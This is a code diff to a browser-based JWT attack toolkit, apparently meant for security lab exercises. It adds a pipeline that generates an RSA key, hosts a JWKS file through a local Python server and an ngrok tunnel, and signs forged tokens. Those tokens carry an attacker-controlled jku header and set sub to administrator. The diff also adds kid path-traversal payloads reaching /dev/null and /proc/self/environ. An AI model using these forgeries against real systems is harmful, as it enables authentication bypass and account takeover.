@@ -1352,6 +1352,316 @@
             background: rgba(16, 185, 129, 0.2);
             border-color: var(--accent-green);
         }
+
+        /* ========== JKU PIPELINE PANEL ========== */
+        .jku-pipeline {
+            grid-column: 1 / -1;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin-top: 0.5rem;
+        }
+
+        .pipeline-step {
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-sm);
+            padding: 1.25rem;
+            position: relative;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+        }
+
+        .pipeline-step:hover {
+            border-color: rgba(99, 102, 241, 0.2);
+        }
+
+        .pipeline-step.step-complete {
+            border-color: rgba(34, 197, 94, 0.25);
+            background: rgba(34, 197, 94, 0.03);
+        }
+
+        .pipeline-step-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .pipeline-step-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            font-weight: 700;
+        }
+
+        .pipeline-step-num {
+            width: 26px;
+            height: 26px;
+            background: rgba(99, 102, 241, 0.15);
+            color: var(--accent-primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.72rem;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+
+        .pipeline-step.step-complete .pipeline-step-num {
+            background: rgba(34, 197, 94, 0.15);
+            color: var(--accent-green);
+        }
+
+        .pipeline-step-badge {
+            font-size: 0.62rem;
+            font-weight: 700;
+            padding: 3px 10px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+
+        .badge-idle {
+            background: rgba(100, 116, 139, 0.12);
+            color: var(--text-muted);
+            border: 1px solid rgba(100, 116, 139, 0.2);
+        }
+
+        .badge-ready {
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--accent-green);
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+
+        .badge-running {
+            background: rgba(245, 158, 11, 0.1);
+            color: var(--accent-amber);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+            animation: pulse 1.5s infinite;
+        }
+
+        .badge-error {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .pipeline-step-body {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .pipeline-cmd {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent-cyan);
+        }
+
+        .pipeline-cmd code {
+            flex: 1;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
+
+        .pipeline-copy-btn {
+            flex-shrink: 0;
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--accent-primary);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            padding: 5px 12px;
+            border-radius: 6px;
+            font-size: 0.68rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .pipeline-copy-btn:hover {
+            background: rgba(99, 102, 241, 0.2);
+            border-color: var(--accent-primary);
+        }
+
+        .pipeline-copy-btn.copied {
+            background: rgba(34, 197, 94, 0.15);
+            color: var(--accent-green);
+            border-color: rgba(34, 197, 94, 0.25);
+        }
+
+        .pipeline-action-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px 18px;
+            border-radius: 8px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+            border: 1px solid transparent;
+            margin-top: 10px;
+        }
+
+        .pipeline-action-btn.btn-primary {
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            color: white;
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .pipeline-action-btn.btn-primary:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px var(--accent-glow);
+        }
+
+        .pipeline-action-btn.btn-success {
+            background: rgba(34, 197, 94, 0.12);
+            color: var(--accent-green);
+            border-color: rgba(34, 197, 94, 0.25);
+        }
+
+        .pipeline-action-btn.btn-success:hover {
+            background: rgba(34, 197, 94, 0.2);
+        }
+
+        .pipeline-action-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .pipeline-input-row {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+            align-items: center;
+        }
+
+        .pipeline-input-row input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-xs);
+            padding: 9px 14px;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+
+        .pipeline-input-row input:focus {
+            outline: none;
+            border-color: rgba(99, 102, 241, 0.4);
+        }
+
+        .pipeline-input-row input::placeholder {
+            color: var(--text-muted);
+            font-family: var(--font-sans);
+        }
+
+        .pipeline-ngrok-url {
+            margin-top: 12px;
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.06), rgba(6, 182, 212, 0.06));
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .pipeline-ngrok-url .url-label {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: var(--accent-green);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            white-space: nowrap;
+        }
+
+        .pipeline-ngrok-url .url-value {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: var(--accent-cyan);
+            word-break: break-all;
+        }
+
+        .pipeline-divider {
+            width: 2px;
+            height: 16px;
+            background: rgba(99, 102, 241, 0.15);
+            margin: 0 auto;
+            border-radius: 1px;
+        }
+
+        .pipeline-hint {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            margin-top: 6px;
+            line-height: 1.5;
+        }
+
+        .pipeline-jwks-preview {
+            margin-top: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 12px;
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--accent-primary);
+            white-space: pre-wrap;
+            max-height: 180px;
+            overflow-y: auto;
+            line-height: 1.6;
+        }
+
+        .pipeline-check-result {
+            margin-top: 10px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            display: none;
+        }
+
+        .pipeline-check-result.success {
+            display: block;
+            background: rgba(34, 197, 94, 0.08);
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            color: var(--accent-green);
+        }
+
+        .pipeline-check-result.error {
+            display: block;
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: var(--accent-red);
+        }
+
+        .pipeline-saved-indicator {
+            font-size: 0.68rem;
+            color: var(--accent-green);
+            margin-left: 8px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .pipeline-saved-indicator.show {
+            opacity: 1;
+        }
     </style>
 </head>
 
@@ -1602,17 +1912,17 @@
                 algo: 'RS256 → External JWKS',
                 desc: 'Point the jku header to an attacker-controlled JWKS URL. Server fetches your public key and verifies your forged token.',
                 fields: [
-                    { id: 'rsa_keys', label: 'RSA Key Management', type: 'rsa_key_ui' },
-                    { id: 'jku_url', label: 'Attacker JWKS URL', type: 'text', value: 'https://exploit-server.net/.well-known/jwks.json', hint: 'URL where your JWKS is hosted' },
-                    { id: 'kid_value', label: 'Key ID (kid)', type: 'text', value: 'attacker-key', hint: 'Must match the kid in your hosted JWKS' },
+                    { id: 'jku_pipeline', label: 'JKU Attack Pipeline', type: 'jku_pipeline' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
                     { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
                 ],
                 steps: [
-                    'Generate a new RSA key pair in Burp JWT Editor',
-                    'Right-click the key → Copy Public Key as JWK',
-                    'Host a JWKS file: {"keys": [<your-jwk>]} on exploit server',
-                    'Modify JWT header: add "jku" pointing to your URL, set matching "kid"',
+                    'Install ngrok and configure your authtoken',
+                    'Generate a new RSA key pair using the tool above',
+                    'Download the generated JWKS file to a local folder',
+                    'Start a local Python HTTP server in that folder (port 8000)',
+                    'Start an ngrok tunnel to expose port 8000 publicly',
+                    'Paste the ngrok URL — it auto-fills the JWT jku header',
                     'Change "sub" to "administrator", sign with your private key, and send'
                 ]
             },
@@ -1627,13 +1937,14 @@
                 desc: 'Set kid to point to a predictable file like /dev/null (empty file), then sign with an empty string secret.',
                 fields: [
                     {
-                        id: 'kid_path', label: 'KID Path', type: 'select', options: [
+                        id: 'kid_path', label: 'KID Path', type: 'datalist', options: [
+                            '../../../dev/null',
                             '../../../../../../../dev/null',
                             '/dev/null',
                             '../../../../../../dev/null',
                             '../../../../../../../proc/self/environ',
                             '../../../../../../../etc/hostname'
-                        ], hint: 'Path to a predictable file — /dev/null returns empty string'
+                        ], value: '../../../dev/null', hint: 'Path to a predictable file — /dev/null returns empty string'
                     },
                     { id: 'signing_secret', label: 'Signing Secret', type: 'text', value: '', hint: 'For /dev/null, use empty string' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
@@ -1805,6 +2116,146 @@
                             <button class="copy-jwks-btn" id="copyJwksBtn" onclick="copyJWKS()" style="display:none">📋 Copy JWKS JSON to Clipboard</button>
                         </div>
                     `;
+                } else if (f.type === 'jku_pipeline') {
+                    const savedToken = localStorage.getItem('ngrok_authtoken') || '';
+                    const savedTokenMasked = savedToken ? ('•'.repeat(Math.max(0, savedToken.length - 4)) + savedToken.slice(-4)) : '';
+                    fieldsHTML += `
+                        <div class="jku-pipeline" id="jkuPipeline">
+                            <!-- STEP 1: Install Ngrok -->
+                            <div class="pipeline-step" id="pipelineStep1">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">1</span>
+                                        <span>Install Ngrok</span>
+                                    </div>
+                                    <span class="pipeline-step-badge badge-idle" id="step1Badge">Pending</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Ngrok creates a secure tunnel from a public URL to your local machine.
+                                    <div class="pipeline-cmd">
+                                        <code>winget install ngrok.ngrok</code>
+                                        <button class="pipeline-copy-btn" onclick="pipelineCopyCmd('winget install ngrok.ngrok', this)">📋 Copy</button>
+                                    </div>
+                                    <div class="pipeline-hint">Run this in PowerShell if ngrok is not installed. If already installed, skip this step.</div>
+                                    <button class="pipeline-action-btn btn-success" onclick="markStepComplete(1)" style="margin-top:10px">✅ Ngrok is Installed — Mark Complete</button>
+                                </div>
+                            </div>
+                            <div class="pipeline-divider"></div>
+
+                            <!-- STEP 2: Ngrok Authtoken -->
+                            <div class="pipeline-step" id="pipelineStep2">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">2</span>
+                                        <span>Configure Ngrok Authtoken</span>
+                                    </div>
+                                    <span class="pipeline-step-badge ${savedToken ? 'badge-ready' : 'badge-idle'}" id="step2Badge">${savedToken ? 'Saved' : 'Pending'}</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Get your authtoken from <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank" style="color: var(--accent-cyan)">dashboard.ngrok.com</a>
+                                    <div class="pipeline-input-row">
+                                        <input type="text" id="ngrokAuthToken" placeholder="Paste your ngrok authtoken here..." value="${savedToken}">
+                                        <button class="pipeline-action-btn btn-primary" onclick="saveNgrokAuthToken()" style="margin-top:0">💾 Save</button>
+                                    </div>
+                                    ${savedToken ? '<div class="pipeline-hint">✅ Token saved: ' + savedTokenMasked + '</div>' : '<div class="pipeline-hint">Your token will be saved locally for convenience.</div>'}
+                                    <div class="pipeline-cmd" id="ngrokAuthCmd" style="display:${savedToken ? 'flex' : 'none'}">
+                                        <code id="ngrokAuthCmdText">ngrok config add-authtoken ${savedToken}</code>
+                                        <button class="pipeline-copy-btn" onclick="pipelineCopyCmd(document.getElementById('ngrokAuthCmdText').textContent, this)">📋 Copy</button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="pipeline-divider"></div>
+
+                            <!-- STEP 3: Generate RSA Key -->
+                            <div class="pipeline-step" id="pipelineStep3">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">3</span>
+                                        <span>Generate RSA Key Pair</span>
+                                    </div>
+                                    <span class="pipeline-step-badge ${currentRSAKey ? 'badge-ready' : 'badge-idle'}" id="step3Badge">${currentRSAKey ? 'Key Active' : 'Pending'}</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Generate a 2048-bit RSA key pair. The public key becomes part of the JWKS file.
+                                    <div style="margin-top:10px">
+                                        <button class="pipeline-action-btn btn-primary" id="jkuRsaGenBtn" onclick="generateRSAKeyPairForJKU()">🔑 Generate 2048-bit RSA Key</button>
+                                    </div>
+                                    <div class="pipeline-jwks-preview" id="jkuJwkPreview" style="display:${currentRSAKey ? 'block' : 'none'}">${currentRSAKey ? JSON.stringify(currentRSAKey.jwk, null, 2) : ''}</div>
+                                </div>
+                            </div>
+                            <div class="pipeline-divider"></div>
+
+                            <!-- STEP 4: Create & Download JWKS + Start Server -->
+                            <div class="pipeline-step" id="pipelineStep4">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">4</span>
+                                        <span>Create JWKS & Start Local Server</span>
+                                    </div>
+                                    <span class="pipeline-step-badge badge-idle" id="step4Badge">Pending</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Download the <code style="color:var(--accent-amber)">jwks.json</code> file, then start a Python HTTP server in that folder.
+                                    <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap">
+                                        <button class="pipeline-action-btn btn-primary" id="downloadJwksBtn" onclick="downloadJWKSFile()" disabled>📥 Download jwks.json</button>
+                                        <button class="pipeline-action-btn btn-success" id="copyJwksContentBtn" onclick="copyJWKSContent()" disabled>📋 Copy JWKS Content</button>
+                                    </div>
+                                    <div class="pipeline-jwks-preview" id="jkuJwksPreview" style="display:none"></div>
+                                    <div class="pipeline-cmd" style="margin-top:12px">
+                                        <code>cd path/to/jwks-folder && python -m http.server 8000</code>
+                                        <button class="pipeline-copy-btn" onclick="pipelineCopyCmd('python -m http.server 8000', this)">📋 Copy</button>
+                                    </div>
+                                    <div class="pipeline-hint">Navigate to the folder where you saved jwks.json, then run the server. Your file will be at <code style="color:var(--accent-cyan)">http://localhost:8000/jwks.json</code></div>
+                                    <button class="pipeline-action-btn btn-success" onclick="markStepComplete(4)" style="margin-top:8px">✅ Server Running — Mark Complete</button>
+                                </div>
+                            </div>
+                            <div class="pipeline-divider"></div>
+
+                            <!-- STEP 5: Start Ngrok Tunnel -->
+                            <div class="pipeline-step" id="pipelineStep5">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">5</span>
+                                        <span>Start Ngrok Tunnel</span>
+                                    </div>
+                                    <span class="pipeline-step-badge badge-idle" id="step5Badge">Pending</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Open a <strong>new terminal</strong> and run ngrok to create a public tunnel:
+                                    <div class="pipeline-cmd">
+                                        <code>ngrok http 8000</code>
+                                        <button class="pipeline-copy-btn" onclick="pipelineCopyCmd('ngrok http 8000', this)">📋 Copy</button>
+                                    </div>
+                                    <div class="pipeline-hint">Look for the <code style="color:var(--accent-cyan)">Forwarding</code> line in the output → copy the <code style="color:var(--accent-green)">https://xxxxx.ngrok-free.app</code> URL.</div>
+                                </div>
+                            </div>
+                            <div class="pipeline-divider"></div>
+
+                            <!-- STEP 6: Paste Ngrok URL -->
+                            <div class="pipeline-step" id="pipelineStep6">
+                                <div class="pipeline-step-header">
+                                    <div class="pipeline-step-title">
+                                        <span class="pipeline-step-num">6</span>
+                                        <span>Set Ngrok URL as JKU</span>
+                                    </div>
+                                    <span class="pipeline-step-badge badge-idle" id="step6Badge">Pending</span>
+                                </div>
+                                <div class="pipeline-step-body">
+                                    Paste the ngrok forwarding URL below. It will be used as the <code style="color:var(--accent-amber)">jku</code> value in your JWT header.
+                                    <div class="pipeline-input-row">
+                                        <input type="text" id="ngrokPublicUrl" placeholder="https://abc123.ngrok-free.app  (or paste full /jwks.json URL)" oninput="onNgrokUrlChange()">
+                                        <button class="pipeline-action-btn btn-primary" onclick="verifyNgrokJWKS()" style="margin-top:0">🔍 Verify</button>
+                                    </div>
+                                    <div class="pipeline-ngrok-url" id="jkuUrlDisplay" style="display:none">
+                                        <span class="url-label">JKU URL →</span>
+                                        <span class="url-value" id="jkuFinalUrl"></span>
+                                    </div>
+                                    <div class="pipeline-check-result" id="jkuVerifyResult"></div>
+                                    <div class="pipeline-hint">The full JKU URL will be: <code style="color:var(--accent-cyan)" id="jkuPreviewUrl">https://&lt;your-ngrok-url&gt;/jwks.json</code></div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
                 } else if (f.type === 'alg_confusion_tool') {
                     fieldsHTML += `
                         <div class="config-field full-width">
@@ -1816,6 +2267,17 @@
                             <div class="field-hint" style="margin-top:8px">Servers usually use the raw bytes of the public key as the secret.</div>
                         </div>
                     `;
+                } else if (f.type === 'datalist') {
+                    fieldsHTML += `
+                    <div class="config-field">
+                        <label for="cfg-${f.id}">${f.label}</label>
+                        <input type="text" id="cfg-${f.id}" value="${f.value || ''}" list="list-${f.id}" placeholder="${f.hint || ''}">
+                        <datalist id="list-${f.id}">
+                            ${f.options.map(o => `<option value="${o}">${o}</option>`).join('')}
+                        </datalist>
+                        ${f.hint ? `<div class="config-hint">${f.hint}</div>` : ''}
+                    </div>
+                `;
                 } else if (f.type === 'select') {
                     fieldsHTML += `
                     <div class="config-field">
@@ -2337,14 +2799,17 @@
                 }
 
                 case 'jku_injection': {
-                    const jkuUrl = getVal('jku_url');
-                    const kidVal = getVal('kid_value');
+                    // Get JKU URL from pipeline
+                    const ngrokUrlInput = document.getElementById('ngrokPublicUrl');
+                    const ngrokBase = ngrokUrlInput ? normaliseNgrokBase(ngrokUrlInput.value) : '';
+                    const jkuUrl = ngrokBase ? `${ngrokBase}/jwks.json` : '';
+                    const kidVal = currentRSAKey ? currentRSAKey.jwk.kid : 'attacker-key';
                     
                     if (!currentRSAKey) {
-                        notes.push('⚠️ No RSA Key generated! Click "Generate RSA Key" and host the JWKS at the JKU URL.');
+                        notes.push('⚠️ No RSA Key generated! Use Step 3 in the pipeline above.');
                         applyPayloadChanges();
                         modifiedHeader.alg = 'RS256';
-                        modifiedHeader.jku = jkuUrl;
+                        if (jkuUrl) modifiedHeader.jku = jkuUrl;
                         modifiedHeader.kid = kidVal;
                         const h = base64UrlEncode(JSON.stringify(modifiedHeader));
                         const p = base64UrlEncode(JSON.stringify(modifiedPayload));
@@ -2352,14 +2817,20 @@
                     } else {
                         applyPayloadChanges();
                         modifiedHeader.alg = 'RS256';
-                        modifiedHeader.jku = jkuUrl;
+                        modifiedHeader.jku = jkuUrl || 'https://<YOUR_NGROK_URL>/jwks.json';
                         modifiedHeader.kid = kidVal;
                         
                         const h = base64UrlEncode(JSON.stringify(modifiedHeader));
                         const p = base64UrlEncode(JSON.stringify(modifiedPayload));
                         const signature = await rs256Sign(`${h}.${p}`, currentRSAKey.privateKey);
                         resultToken = `${h}.${p}.${signature}`;
-                        notes.push(`✅ Token signed with RSA key. Ensure JWKS is hosted at: ${jkuUrl}`);
+                        if (jkuUrl) {
+                            notes.push(`✅ Token signed with RSA key. jku → ${jkuUrl}`);
+                            notes.push(`✅ kid synced from generated JWK: "${kidVal}"`);
+                        } else {
+                            notes.push(`✅ Token signed with RSA key.`);
+                            notes.push(`⚠️ No ngrok URL set — update jku in Step 6 of the pipeline.`);
+                        }
                     }
                     break;
                 }
@@ -2501,6 +2972,253 @@
             toast.style.color = isError ? 'var(--accent-red)' : 'var(--accent-green)';
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ========== JKU PIPELINE FUNCTIONS ==========
+
+        // Copy a terminal command to clipboard
+        function pipelineCopyCmd(cmd, btnEl) {
+            navigator.clipboard.writeText(cmd).then(() => {
+                const origText = btnEl.textContent;
+                btnEl.textContent = '✅ Copied!';
+                btnEl.classList.add('copied');
+                showToast(`📋 Copied: ${cmd.substring(0, 50)}${cmd.length > 50 ? '...' : ''}`);
+                setTimeout(() => {
+                    btnEl.textContent = origText;
+                    btnEl.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // Mark a pipeline step as complete
+        function markStepComplete(stepNum) {
+            const step = document.getElementById(`pipelineStep${stepNum}`);
+            const badge = document.getElementById(`step${stepNum}Badge`);
+            if (step) step.classList.add('step-complete');
+            if (badge) {
+                badge.textContent = 'Complete';
+                badge.className = 'pipeline-step-badge badge-ready';
+            }
+        }
+
+        // Save ngrok authtoken to localStorage
+        function saveNgrokAuthToken() {
+            const input = document.getElementById('ngrokAuthToken');
+            const token = input.value.trim();
+            if (!token) {
+                showToast('⚠️ Please enter your ngrok authtoken', true);
+                return;
+            }
+            localStorage.setItem('ngrok_authtoken', token);
+
+            // Update command display
+            const cmdText = document.getElementById('ngrokAuthCmdText');
+            const cmdRow = document.getElementById('ngrokAuthCmd');
+            cmdText.textContent = `ngrok config add-authtoken ${token}`;
+            cmdRow.style.display = 'flex';
+
+            // Update badge
+            const badge = document.getElementById('step2Badge');
+            badge.textContent = 'Saved';
+            badge.className = 'pipeline-step-badge badge-ready';
+            document.getElementById('pipelineStep2').classList.add('step-complete');
+
+            showToast('💾 Ngrok authtoken saved!');
+        }
+
+        // Generate RSA key pair specifically for JKU pipeline
+        async function generateRSAKeyPairForJKU() {
+            const btn = document.getElementById('jkuRsaGenBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Generating...';
+
+            try {
+                const keyPair = await window.crypto.subtle.generateKey(
+                    {
+                        name: "RSASSA-PKCS1-v1_5",
+                        modulusLength: 2048,
+                        publicExponent: new Uint8Array([1, 0, 1]),
+                        hash: "SHA-256"
+                    },
+                    true,
+                    ["sign", "verify"]
+                );
+
+                const jwk = await window.crypto.subtle.exportKey("jwk", keyPair.publicKey);
+                jwk.alg = 'RS256';
+                jwk.kid = window.crypto.randomUUID ? window.crypto.randomUUID() : Math.random().toString(36).substring(2);
+
+                currentRSAKey = {
+                    publicKey: keyPair.publicKey,
+                    privateKey: keyPair.privateKey,
+                    jwk: jwk
+                };
+
+                // Update Step 3 UI
+                const preview = document.getElementById('jkuJwkPreview');
+                preview.textContent = JSON.stringify(jwk, null, 2);
+                preview.style.display = 'block';
+
+                const badge = document.getElementById('step3Badge');
+                badge.textContent = 'Key Active';
+                badge.className = 'pipeline-step-badge badge-ready';
+                document.getElementById('pipelineStep3').classList.add('step-complete');
+
+                btn.textContent = '🔄 Regenerate RSA Key';
+                btn.disabled = false;
+
+                // Enable download buttons in Step 4
+                const dlBtn = document.getElementById('downloadJwksBtn');
+                const cpBtn = document.getElementById('copyJwksContentBtn');
+                if (dlBtn) dlBtn.disabled = false;
+                if (cpBtn) cpBtn.disabled = false;
+
+                // Update JWKS preview in Step 4
+                updateJWKSPreview();
+
+                showToast('🔑 RSA Key Pair generated for JKU attack!');
+            } catch (err) {
+                console.error(err);
+                showToast('❌ Error generating RSA key.', true);
+                btn.textContent = '🔑 Generate 2048-bit RSA Key';
+                btn.disabled = false;
+            }
+        }
+
+        // Update JWKS preview in step 4
+        function updateJWKSPreview() {
+            if (!currentRSAKey) return;
+            const jwks = { keys: [currentRSAKey.jwk] };
+            const preview = document.getElementById('jkuJwksPreview');
+            if (preview) {
+                preview.textContent = JSON.stringify(jwks, null, 2);
+                preview.style.display = 'block';
+            }
+        }
+
+        // Download JWKS file
+        function downloadJWKSFile() {
+            if (!currentRSAKey) {
+                showToast('⚠️ Generate an RSA key first (Step 3)', true);
+                return;
+            }
+            const jwks = { keys: [currentRSAKey.jwk] };
+            const content = JSON.stringify(jwks, null, 2);
+            const blob = new Blob([content], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'jwks.json';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            showToast('📥 jwks.json downloaded! Place it in a folder and start the server.');
+            
+            // Mark step 4 badge as ready
+            const badge = document.getElementById('step4Badge');
+            if (badge) {
+                badge.textContent = 'Downloaded';
+                badge.className = 'pipeline-step-badge badge-running';
+            }
+        }
+
+        // Copy JWKS content to clipboard
+        function copyJWKSContent() {
+            if (!currentRSAKey) {
+                showToast('⚠️ Generate an RSA key first (Step 3)', true);
+                return;
+            }
+            const jwks = { keys: [currentRSAKey.jwk] };
+            navigator.clipboard.writeText(JSON.stringify(jwks, null, 2));
+            showToast('📋 JWKS content copied to clipboard!');
+        }
+
+        // Normalise a pasted ngrok URL — strips trailing /jwks.json so the user
+        // can paste either the base URL or the full JWKS URL and get the same result.
+        function normaliseNgrokBase(raw) {
+            let url = raw.trim().replace(/\/$/, '');
+            if (url.endsWith('/jwks.json')) url = url.slice(0, -10);
+            return url;
+        }
+
+        // Handle ngrok URL input change
+        function onNgrokUrlChange() {
+            const input = document.getElementById('ngrokPublicUrl');
+            const url = normaliseNgrokBase(input.value);
+            const display = document.getElementById('jkuUrlDisplay');
+            const finalUrl = document.getElementById('jkuFinalUrl');
+            const previewUrl = document.getElementById('jkuPreviewUrl');
+
+            if (url) {
+                const fullUrl = `${url}/jwks.json`;
+                display.style.display = 'flex';
+                finalUrl.textContent = fullUrl;
+                previewUrl.textContent = fullUrl;
+
+                // Update badge
+                const badge = document.getElementById('step6Badge');
+                badge.textContent = 'URL Set';
+                badge.className = 'pipeline-step-badge badge-ready';
+                document.getElementById('pipelineStep6').classList.add('step-complete');
+
+                // Update step 5 as well
+                markStepComplete(5);
+            } else {
+                display.style.display = 'none';
+                previewUrl.textContent = 'https://<your-ngrok-url>/jwks.json';
+            }
+        }
+
+        // Verify ngrok JWKS endpoint is accessible
+        async function verifyNgrokJWKS() {
+            const input = document.getElementById('ngrokPublicUrl');
+            const base = normaliseNgrokBase(input.value);
+            const resultEl = document.getElementById('jkuVerifyResult');
+
+            if (!base) {
+                showToast('⚠️ Enter the ngrok URL first', true);
+                return;
+            }
+
+            const fullUrl = `${base}/jwks.json`;
+            resultEl.textContent = '⏳ Verifying...';
+            resultEl.className = 'pipeline-check-result';
+            resultEl.style.display = 'block';
+            resultEl.style.background = 'rgba(245, 158, 11, 0.08)';
+            resultEl.style.borderColor = 'rgba(245, 158, 11, 0.2)';
+            resultEl.style.color = 'var(--accent-amber)';
+
+            try {
+                // ngrok-skip-browser-warning bypasses ngrok's interstitial page for programmatic requests
+                const response = await fetch(fullUrl, {
+                    mode: 'cors',
+                    headers: { 'ngrok-skip-browser-warning': '1' }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.keys && data.keys.length > 0) {
+                        resultEl.textContent = `✅ JWKS verified! Found ${data.keys.length} key(s) at ${fullUrl}`;
+                        resultEl.className = 'pipeline-check-result success';
+                        markStepComplete(6);
+                    } else {
+                        resultEl.textContent = '⚠️ Response OK but no keys found in JWKS';
+                        resultEl.className = 'pipeline-check-result error';
+                    }
+                } else {
+                    resultEl.textContent = `❌ HTTP ${response.status} — Make sure the Python server and ngrok are both running`;
+                    resultEl.className = 'pipeline-check-result error';
+                }
+            } catch (err) {
+                // Still show the correct URL so user can open it manually
+                resultEl.innerHTML = `❌ CORS blocked from browser — but your JWKS is likely working! <br><a href="${fullUrl}" target="_blank" style="color:var(--accent-cyan)">Open ${fullUrl} in a new tab ↗</a> to confirm.`;
+                resultEl.className = 'pipeline-check-result error';
+            }
+        }
+
+        function updateGenerator() {
+            // Placeholder for cross-panel updates
         }
 
         // ========== INIT ==========
